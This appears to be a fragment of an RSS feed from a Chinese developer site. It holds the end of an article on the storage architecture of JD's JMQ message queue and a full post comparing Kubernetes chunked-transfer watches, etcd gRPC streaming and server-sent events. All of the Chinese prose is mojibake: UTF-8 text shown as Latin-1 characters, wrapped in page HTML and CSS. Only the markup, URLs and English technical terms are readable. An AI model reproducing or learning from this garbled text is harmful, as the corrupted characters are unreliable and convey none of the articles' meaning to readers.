<p>åˆ·ç›˜ç­–ç•¥ï¼šæ”¯æŒã€Œå¼‚æ­¥åˆ·ç›˜ï¼ˆé«˜ååï¼‰ã€ã€ŒåŒæ­¥åˆ·ç›˜ï¼ˆé‡‘èçº§å¯é æ€§ï¼‰ã€åŠ¨æ€åˆ‡æ¢ã€‚</p>
<h2 data-id="heading-2">03.JMQå­˜å‚¨æ¶æ„</h2>
<p>JMQçš„æ¶ˆæ¯å­˜å‚¨åˆ†åˆ«å‚è€ƒäº†Kafkaå’ŒRocketMQå­˜å‚¨è®¾è®¡ä¸Šä¼˜ç‚¹ï¼Œå¹¶æ ¹æ®äº¬ä¸œå†…éƒ¨çš„åº”ç”¨åœºæ™¯è¿›è¡Œäº†æ”¹è¿›å’Œåˆ›æ–°ã€‚</p>
<p>3.1 æ ¸å¿ƒå­˜å‚¨æ¨¡å‹ï¼šåˆ†åŒºæ—¥å¿— + é˜Ÿåˆ—å…¼å®¹</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b7d0ce7ad41a47fb82d8f7057ce9b313~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Lqs5Lic6Zu25ZSu5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769073619&amp;x-signature=JROr2XwPO1BI0%2BYmDu%2FwNZL%2BVDo%3D" alt="image.png" loading="lazy"/></p>
<p>JMQå­˜å‚¨çš„åŸºæœ¬å•å…ƒæ˜¯PartitionGroupã€‚åœ¨åŒä¸€ä¸ªBrokerä¸Šï¼Œæ¯ä¸ªPartitionGroupå¯¹åº”ä¸€ç»„æ¶ˆæ¯æ–‡ä»¶ï¼ˆJournal Filesï¼‰ï¼Œé¡ºåºå­˜æ”¾è¿™ä¸ªTopicçš„æ¶ˆæ¯ã€‚</p>
<p>ä¸Kafkaç±»ä¼¼ï¼Œæ¯ä¸ªTopicåŒ…å«è‹¥å¹²Partitionï¼Œæ¯ä¸ªPartitionå¯¹åº”ä¸€ç»„ç´¢å¼•æ–‡ä»¶ï¼ˆIndex Filesï¼‰ï¼Œç´¢å¼•ä¸­å­˜æ”¾æ¶ˆæ¯åœ¨æ¶ˆæ¯æ–‡ä»¶ä¸­çš„ä½ç½®å’Œæ¶ˆæ¯é•¿åº¦ã€‚æ¶ˆæ¯å†™å…¥æ—¶ï¼Œæ”¶åˆ°çš„æ¶ˆæ¯æŒ‰ç…§å¯¹åº”çš„PartitionGroupå†™å…¥ä¾æ¬¡è¿½åŠ å†™å…¥æ¶ˆæ¯æ–‡ä»¶ä¸­ï¼Œç„¶åå¼‚æ­¥åˆ›å»ºç´¢å¼•å¹¶å†™å…¥å¯¹åº”Partitionçš„ç´¢å¼•æ–‡ä»¶ä¸­ã€‚</p>
<p>ä»¥PartionGroupä¸ºåŸºæœ¬å­˜å‚¨å•å…ƒçš„è®¾è®¡ï¼Œåœ¨å…¼é¡¾çµæ´»æ€§çš„åŒæ—¶ï¼Œå…·æœ‰è¾ƒå¥½çš„æ€§èƒ½ï¼Œå¹¶ä¸”å•ä¸ªPartitionGroupå¯ä»¥æ”¯æŒæ›´å¤šçš„å¹¶å‘ã€‚</p>
<p>3.2 æ¶ˆæ¯è¯»/å†™è¿‡ç¨‹</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b87983dfc5584cebbdd75b1f3abde585~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Lqs5Lic6Zu25ZSu5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769073619&amp;x-signature=mojnShAVOt0Jt1OBHxDhGo3qXuc%3D" alt="image.png" loading="lazy"/></p>
<p>å†™æ¶ˆæ¯ï¼š</p>
<p>JMQçš„å†™æ“ä½œä½¿ç”¨DirectBufferä½œä¸ºç¼“å­˜ï¼Œæ•°æ®å…ˆå†™å…¥DirectBufferï¼Œå†å¼‚æ­¥é€šè¿‡FileChannelå†™å…¥åˆ°æ–‡ä»¶ä¸­ã€‚</p>
<p>æ¶ˆæ¯å†™å…¥DirectBufferåï¼Œé»˜è®¤å†™å…¥è¯¥èŠ‚ç‚¹æˆåŠŸï¼ˆæ•°æ®çš„é«˜å¯é æ˜¯é€šè¿‡Raftåè®®å¤åˆ¶ï¼Œç”¨å¤šä¸ªå†…å­˜å‰¯æœ¬æ¥ä¿è¯ï¼‰ï¼Œç›¸å¯¹Kafkaçš„å†™æ“ä½œæ¥çœ‹ï¼ŒJMQå“åº”å†™å…¥è¯·æ±‚çš„å¤„ç†è¿‡ç¨‹æ²¡æœ‰å‘ç”Ÿç³»ç»Ÿè°ƒç”¨ï¼Œåœ¨äº¬ä¸œå†…éƒ¨çš„å¤§é‡å•æ¡åŒæ­¥å‘é€çš„åœºæ™¯ä¸‹å¼€é”€æ›´ä½ã€æ€§èƒ½æ›´ä¼˜ã€‚</p>
<p>åŒæ—¶ä¹Ÿé¿å…ä½¿ç”¨MappedByteBufferï¼ˆMmapæ–¹å¼ï¼‰äº§ç”ŸPage Faultä¸­æ–­ï¼ŒOSåœ¨ä¸­æ–­ä¸­å°†è¯¥é¡µå¯¹åº”ç£ç›˜ä¸­çš„æ•°æ®æ‹·è´åˆ°å†…å­˜ä¸­ï¼Œåœ¨å¯¹æ–‡ä»¶è¿›è¡Œè¿½åŠ å†™å…¥çš„æƒ…å†µä¸‹ï¼Œè¿™ä¸€æ— æ³•é¿å…çš„è¿‡ç¨‹æ˜¯å®Œå…¨æ²¡æœ‰å¿…è¦ï¼Œåè€Œå¢åŠ äº†å†™å…¥çš„è€—æ—¶çš„é—®é¢˜ã€‚</p>
<p>è¯»æ¶ˆæ¯ï¼š</p>
<p>JMQé‡‡ç”¨å®šé•¿ç¨ å¯†ç´¢å¼•è®¾è®¡ï¼Œæ¯ä¸ªç´¢å¼•å›ºå®šé•¿åº¦ã€‚</p>
<p>å®šé•¿è®¾è®¡çš„å¥½å¤„æ˜¯ï¼Œç›´æ¥æ ¹æ®ç´¢å¼•åºå·å°±å¯ä»¥è®¡ç®—å‡ºç´¢å¼•åœ¨æ–‡ä»¶ä¸­çš„ä½ç½®ï¼šç´¢å¼•ä½ç½® = ç´¢å¼•åºå· * ç´¢å¼•é•¿åº¦ã€‚è¿™æ ·ï¼Œæ¶ˆæ¯çš„æŸ¥æ‰¾è¿‡ç¨‹å°±æ¯”è¾ƒç®€å•äº†ï¼Œé¦–å…ˆè®¡ç®—å‡ºç´¢å¼•æ‰€åœ¨çš„ä½ç½®ï¼Œç›´æ¥è¯»å–ç´¢å¼•ï¼Œç„¶åæ ¹æ®ç´¢å¼•ä¸­è®°å½•çš„æ¶ˆæ¯ä½ç½®è¯»å–æ¶ˆæ¯ã€‚</p>
<p>åœ¨äº¬ä¸œå†…éƒ¨åº”ç”¨åœºæ™¯ä¸­ï¼Œå•æ¡æ¶ˆæ¯å¤„ç†è€—æ—¶é«˜æ˜¯æ¯”è¾ƒå¸¸è§çš„ï¼Œå¾®æœåŠ¡æ¶æ„ä¸‹ç”¨æˆ·ä¸€èˆ¬ä¼šç”³è¯·æ›´å¤šçš„æ¶ˆè´¹èŠ‚ç‚¹ï¼Œè®©æ¯ä¸ªæ¶ˆè´¹èŠ‚ç‚¹å•æ¬¡æ‹‰å–è¾ƒå°æ‰¹é‡çš„æ¶ˆæ¯è¿›è¡Œå¤„ç†ï¼Œä»¥æå‡æ¶ˆè´¹å¹¶è¡Œåº¦ï¼Œè¿™æ ·æ¶ˆè´¹æ‹‰å–è¯·æ±‚çš„æ¬¡æ•°ä¼šæ¯”è¾ƒå¤šï¼Œç¨ å¯†ç´¢å¼•çš„è®¾è®¡ä¼šæ›´é€‚ç”¨å†…éƒ¨çš„åº”ç”¨åœºæ™¯ã€‚</p>
<p>JMQæ¶ˆè´¹è¯»æ“ä½œ99%ä»¥ä¸Šéƒ½èƒ½å‘½ä¸­ç¼“å­˜ï¼ˆJMQè®¾è®¡çš„å †å¤–å†…å­˜ä¸æ–‡ä»¶æ˜ å°„çš„ä¸€ç§ç¼“å­˜æœºåˆ¶ï¼‰ï¼Œé¿å…äº†Kafkaå¯èƒ½é‡åˆ°çš„Cacheè¢«æ±¡æŸ“ï¼Œå½±å“æ€§èƒ½å’Œååçš„é—®é¢˜ã€‚åŒæ—¶ç›´æ¥è¯»å†…å­˜ä¹Ÿè§„é¿äº†RocketMQåœ¨è¯»å–æ¶ˆæ¯å­˜å‚¨çš„æ—¥å¿—æ•°æ®æ–‡ä»¶æ—¶å®¹æ˜“äº§ç”Ÿè¾ƒå¤šçš„éšæœºè®¿é—®è¯»å–ç£ç›˜ï¼Œå½±å“æ€§èƒ½çš„é—®é¢˜ã€‚ï¼ˆå½“æ²¡æœ‰å‘½ä¸­ç¼“å­˜æ—¶ï¼Œä¼šé»˜è®¤é™çº§ä¸ºé€šè¿‡Mmapçš„æ–¹å¼è¯»å–æ¶ˆæ¯ï¼‰ã€‚</p>
<h2 data-id="heading-3">04.ç«å“å¯¹æ¯”åˆ†æ</h2>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/aec6ef9c771743f9b82f4c0dd3f30fcc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Lqs5Lic6Zu25ZSu5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769073619&amp;x-signature=S27xs%2B491GxK9kKV0Rc8w19JDDA%3D" alt="image.png" loading="lazy"/>
åœ¨å•å‰¯æœ¬åœºæ™¯ä¸‹ï¼ŒJMQä¸Kafkaçš„å•æœºå†™å…¥æ€§èƒ½å‡ååˆ†å‡ºè‰²ï¼Œå‡å¯è¾¾åˆ°ç½‘ç»œå¸¦å®½ä¸Šé™ã€‚</p>
<p>ç„¶è€Œï¼Œåœ¨æ›´è´´è¿‘ç”Ÿäº§ç¯å¢ƒçš„ä¸‰å‰¯æœ¬åœºæ™¯ä¸­ï¼Œä¸¤è€…ç‰¹æ€§å‡ºç°åˆ†åŒ–ï¼š</p>
<p>JMQåœ¨ä¸‰å‰¯æœ¬å¼‚æ­¥å†™å…¥ä¸‹çš„æé™ååä¼˜åŠ¿æ˜æ˜¾ï¼Œä¸”åœ¨è·¨æœºæˆ¿éƒ¨ç½²æ—¶ï¼Œå…¶åŒæ­¥å†™å…¥æ€§èƒ½è¡¨ç°è‰¯å¥½ï¼Œå‡ ä¹ä¸å—ç½‘ç»œå»¶è¿Ÿå½±å“ï¼›è€ŒKafkaåˆ™åœ¨å¤šåˆ†åŒºåŒæ­¥å†™å…¥åœºæ™¯ä¸‹å±•ç°å‡ºæ›´ç¨³å®šçš„æ€§èƒ½ï¼Œè¡°å‡å°äºJMQã€‚åœ¨å¤§éƒ¨åˆ†å¼‚æ­¥åååœºæ™¯åŠä¸åŒæ¶ˆæ¯ä½“ä¸‹çš„æ€§èƒ½è¶‹åŠ¿ä¸Šï¼Œä¸¤è€…è¡¨ç°ç›¸å½“ã€‚</p>
<p>ç»¼ä¸Šæ‰€è¿°ï¼ŒJMQå°¤å…¶é€‚åˆå¯¹åŒæ­¥å†™å…¥æ€§èƒ½å’Œå‰¯æœ¬å¼‚æ­¥ååæœ‰æé«˜è¦æ±‚çš„åœºæ™¯ï¼Œè€ŒKafkaåœ¨å¤æ‚åˆ†åŒºçš„é«˜å¹¶å‘åŒæ­¥å†™å…¥æ–¹é¢é€‚åº”æ€§æ›´å¹¿ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[æˆ‘ä¸å…è®¸è°è¿˜åˆ†ä¸æ¸…è¿™ä¸‰ç§watchæœºåˆ¶çš„åŒºåˆ«]]></title>    <link>https://juejin.cn/post/7595341943338729482</link>    <guid>https://juejin.cn/post/7595341943338729482</guid>    <pubDate>2026-01-15T09:41:24.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7595341943338729482" data-draft-id="7595358285722976265" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="æˆ‘ä¸å…è®¸è°è¿˜åˆ†ä¸æ¸…è¿™ä¸‰ç§watchæœºåˆ¶çš„åŒºåˆ«"/> <meta itemprop="keywords" content="åç«¯"/> <meta itemprop="datePublished" content="2026-01-15T09:41:24.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æœ‰æ€åº¦çš„ä¸‹ç­‰é©¬"/> <meta itemprop="url" content="https://juejin.cn/user/448256476727662"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            æˆ‘ä¸å…è®¸è°è¿˜åˆ†ä¸æ¸…è¿™ä¸‰ç§watchæœºåˆ¶çš„åŒºåˆ«
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/448256476727662/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æœ‰æ€åº¦çš„ä¸‹ç­‰é©¬
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-15T09:41:24.000Z" title="Thu Jan 15 2026 09:41:24 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-15
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»2åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>ä»Šå¤©å¿«é€Ÿä»‹ç»ç›®å‰å¸‚åœºé¢å¸¸è§çš„ä¸‰ä¸ªwatchæœºåˆ¶çš„å®ç°ã€‚</p>
<h3 data-id="heading-0">1.chunked transfer encoding</h3>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/20e1607ebb714f749d2e17e808cf383c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pyJ5oCB5bqm55qE5LiL562J6ams:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769074979&amp;x-signature=pCLnNQAqDyyl55TptgbL%2FX298ag%3D" alt="8c91013c-53c2-4f95-a05e-8462918fad1b.webp" loading="lazy"/></p>
<p>k8sæ§åˆ¶é¢å‡ ä¸ªç»„ä»¶ï¼Œæ ¸å¿ƒæ¢çº½æ˜¯apiserverï¼Œ é™¤etcdä¹‹å¤–ï¼Œå…¶ä»–ç»„ä»¶éƒ½é€šè¿‡restfulè¿›è¡Œhttpé€šä¿¡ã€‚</p>
<p>ä¸Šæ–‡æåˆ°çš„<a href="https://juejin.cn/post/7586493936677748776" target="_blank" title="https://juejin.cn/post/7586493936677748776">informeræœºåˆ¶æ˜¯controllerçš„æ ‡å‡†èŒƒå¼</a>ï¼Œ ç›®çš„æ˜¯å®ç°å£°æ˜å¼APIçš„é—­ç¯æ§åˆ¶ï¼Œå‡å°‘äº†å¯¹äºapiserverçš„è°ƒç”¨ã€‚</p>
<p>schedulerå’Œkubeletã€kubectlä¹Ÿæœ‰å¯¹äºapiserverçš„è°ƒç”¨ï¼Œç›‘å¬èµ„æºå˜æ›´çš„æ–¹å¼éƒ½æ˜¯watchAPIï¼Œ è¿™æ˜¯ä¸€ç§éæ ‡å‡†çš„<code>chunked transfer encoding</code>ï¼Œhttp1.1ä¼ è¾“å±‚ç¼–ç ã€‚</p>
<blockquote>
<p>åˆ†å—ä¼ è¾“ç¼–ç ï¼ˆCTEï¼‰æ˜¯ä¸€ç§ HTTP/1.1 æœºåˆ¶ï¼Œé€šè¿‡å°†æ•°æ®åˆ†å‰²ä¸ºå¤šä¸ªå—æ¥æµå¼ä¼ è¾“å“åº”ï¼Œæ¯ä¸ªå—å‰é¢éƒ½å¸¦æœ‰å…¶åå…­è¿›åˆ¶è¡¨ç¤ºçš„å¤§å°ï¼Œä½¿å¾—æœåŠ¡å™¨å¯ä»¥åœ¨ä¸çŸ¥é“æ€»é•¿åº¦çš„æƒ…å†µä¸‹å‘é€æ•°æ®ï¼Œé€‚ç”¨äºåŠ¨æ€å†…å®¹ã€å®æ—¶æ›´æ–°å’Œå¤§æ–‡ä»¶ä¼ è¾“ï¼Œæœ€åä»¥ä¸€ä¸ªé•¿åº¦ä¸ºé›¶çš„å—ç»“æŸã€‚</p>
</blockquote>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/dff8551b3f864c369d8ae7a11bea3266~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pyJ5oCB5bqm55qE5LiL562J6ams:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769074979&amp;x-signature=lrMbKP8%2BlGiup9OH5Xeh7QT%2BK4A%3D" alt="3.png" loading="lazy"/></p>
<h3 data-id="heading-1">2. grpc æµå¼é€šä¿¡</h3>
<p>apiserverä½œä¸ºæ§åˆ¶é¢ç»„ä»¶çš„äº¤äº’æ¢çº½ï¼Œ ä¸åº•å±‚å­˜å‚¨etcdäº¤äº’ã€‚</p>
<p>apiserver ä¹Ÿéœ€è¦watch etcdçš„èµ„æºå˜åŠ¨ï¼Œè¿™æ ·æ‰èƒ½æ¥åŠ›åé¦ˆåˆ°ä¸Šå±‚ç»„ä»¶ï¼ˆschedulerï¼Œkubectlï¼‰ã€‚
<img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c674812a8cbf466d96db7549d4ff53a2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pyJ5oCB5bqm55qE5LiL562J6ams:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769074979&amp;x-signature=yulRstAdeC%2FLnfUxX%2FOyIiEuv6U%3D" alt="image.png" loading="lazy"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/23fabfc56561443a8e187c6223ccae90~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pyJ5oCB5bqm55qE5LiL562J6ams:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769074979&amp;x-signature=JFln%2BzU71L%2Bhpdp6K20fyUPmpmw%3D" alt="55.png" loading="lazy"/></p>
<p>etcdv3 èµ°çš„æ˜¯grpcåè®®ï¼Œå¤©ç”Ÿæ”¯æŒåŒå‘å®æ—¶é€šä¿¡ã€‚</p>
<blockquote>
<p>http2.0 é«˜æ€§èƒ½rpcæ¡†æ¶ï¼Œ å•ä¸ªtcpè¿æ¥ä¸Šå¤šè·¯å¤ç”¨ï¼ŒäºŒè¿›åˆ¶åˆ†å¸§ã€åŒå‘æµå¼é€šä¿¡ï¼Œå¤´éƒ¨å‹ç¼©ã€‚</p>
</blockquote>
<p>apiserveræ˜¯ä½œä¸ºgrpcå®¢æˆ·ç«¯ä¸etcdäº¤äº’ï¼Œetcd çš„ Watch æœºåˆ¶æ˜¯ä¸€ä¸ªé›† MVCC ç‰ˆæœ¬æ§åˆ¶ã€é«˜æ•ˆå†…å­˜ç´¢å¼•ã€æŒä¹…åŒ–å­˜å‚¨å’Œæµå¼ç½‘ç»œé€šä¿¡ äºä¸€ä½“çš„å¤æ‚ç³»ç»Ÿã€‚å…¶æ ¸å¿ƒä»·å€¼åœ¨äºæä¾›äº† åŸºäºé€»è¾‘æ—¶é’Ÿçš„ã€å¯é çš„ã€æœ‰åºçš„å˜æ›´é€šçŸ¥ï¼Œè¿™æ­£æ˜¯ Kubernetes ç­‰åˆ†å¸ƒå¼ç³»ç»Ÿèƒ½å¤Ÿæ„å»ºå‡ºé«˜æ•ˆã€ä¸€è‡´çš„çŠ¶æ€åè°ƒæœºåˆ¶çš„åŸºç¡€ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b66798ad35fb43b4888a5a0ab9f69757~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pyJ5oCB5bqm55qE5LiL562J6ams:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769074979&amp;x-signature=w4dCTaKZGSM0RGWOjDAu6EIFdyU%3D" alt="4.png" loading="lazy"/></p>
<h3 data-id="heading-2">3. æœåŠ¡ç«¯å‘é€äº‹ä»¶SSE</h3>
<p>ç›®å‰ç«çƒ­çš„å¤§æ¨¡å‹åœ¨çº¿æ¨ç†ï¼Œèµ°çš„æ˜¯SSEåè®®ã€‚</p>
<p>æœåŠ¡å™¨å‘é€äº‹ä»¶ï¼ˆSSEï¼‰æ˜¯ä¸€ç§åŸºäºHTTP åè®®çš„<strong>å•å‘</strong>é€šä¿¡åè®®ï¼Œå®ƒå…è®¸æœåŠ¡å™¨ä»¥äº‹ä»¶æµï¼ˆEvent Streamï¼‰çš„å½¢å¼å®æ—¶å‘å®¢æˆ·ç«¯æ¨é€æ•°æ®ï¼Œè€Œæ— éœ€å®¢æˆ·ç«¯æ˜ç¡®è¯·æ±‚ã€‚å®ƒå»ºç«‹åœ¨æ ‡å‡†çš„ HTTP åè®®ä¹‹ä¸Šï¼Œé€šè¿‡å•å‘çš„æŒä¹…è¿æ¥ï¼ŒæœåŠ¡å™¨å¯ä»¥ä¸»åŠ¨å‘å®¢æˆ·ç«¯å‘é€äº‹ä»¶å’Œæ•°æ®ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7dd88d137daf490891d415cee5d3c7da~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pyJ5oCB5bqm55qE5LiL562J6ams:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769074979&amp;x-signature=TpV%2FzOsY8I0XHdzvA%2FBekgftw%2FY%3D" alt="5.png" loading="lazy"/></p>
<p>æœ¬è´¨ä¸Šï¼Œå®ƒæ˜¯ä»¥åº”ç”¨å±‚æ¶ˆæ¯åè®®æ¥å®ç°çš„ï¼Œç”±å®¢æˆ·ç«¯å‘æœåŠ¡ç«¯å‘èµ·å»ºç«‹è¿æ¥è¯·æ±‚ï¼Œå¹¶ä¿æŒè¿æ¥æ‰“å¼€ï¼Œç„¶åæœåŠ¡ç«¯ä¸»åŠ¨æ¨é€æ¶ˆæ¯ç»™å®¢æˆ·ç«¯ï¼ŒæœåŠ¡å™¨ç»™å®¢æˆ·ç«¯å‘é€çš„ SSE æ•°æ®ï¼Œå¿…é¡»æ˜¯ UTF-8 ç¼–ç ï¼Œä¸”è¿”å›çš„å†…å®¹ç±»å‹æ˜¯<code>text/event-stream</code>ã€‚</p>
<p>æ¯”å¦‚å½“ä½ åœ¨ä½¿ç”¨DeepSeek æ—¶ï¼Œå½“ä½ è¯¢é—®å®ƒé—®é¢˜æ—¶ï¼Œä½ ä¼šçœ‹åˆ°å®ƒä¼šé€å­—åœ°å°†å›ç­”æ˜¾ç¤ºå‡ºæ¥ï¼Œå®é™…ä¸Šè¿™æ˜¯DeepSeek å°†å…ˆè®¡ç®—å‡ºçš„æ•°æ®ä¸»åŠ¨çš„â€œæ¨é€â€ç»™ä½ ï¼Œé‡‡ç”¨ SSE æŠ€æœ¯è¾¹è®¡ç®—è¾¹è¿”å›ï¼Œé¿å…æ¥å£ç­‰å¾…æ—¶é—´è¿‡é•¿è€Œç›´æ¥å…³é—­é¡µé¢ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    